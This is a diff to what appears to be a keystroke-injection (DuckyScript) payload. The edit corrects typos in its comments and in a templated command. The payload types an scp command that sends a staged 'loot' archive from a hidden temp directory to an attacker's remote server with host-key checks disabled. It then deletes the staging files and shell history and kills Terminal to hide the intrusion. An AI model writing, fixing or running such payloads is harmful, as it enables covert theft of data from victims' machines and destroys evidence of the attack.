@@ -53,10 +53,10 @@ REM # NOTE: The payload is configured to use SSH as the protcol for the file tra
 REM ##########################################################################################################################################################################
 
 REM ## The SCP way ##
-REM ## Usage: Replace the <port>, <attaccker username>, <attacker hostname> and <remote storage path> with the credentials, hostname and path on the remote SCP server
+REM ## Usage: Replace the <port>, <attacker username>, <attacker hostname> and <remote storage path> with the credentials, hostname and path on the remote SCP server
 REM ------------------------------------------------------------------------------------------------------------------------------------------------------------------
 DELAY 300
-STRING wait %1 && clear && scp -q -P <PORT> -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz <attacker username>@<attackerhostname?:<remote storage path> && \ 
+STRING wait %1 && clear && scp -q -P <port> -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz <attacker username>@<attackerhostname>:<remote storage path> && \ 
 ENTER
 DELAY 300
 STRING clear && set -x && rm -rf /tmp/.s ~/.bash_history ~/.zsh_history && killall Terminal
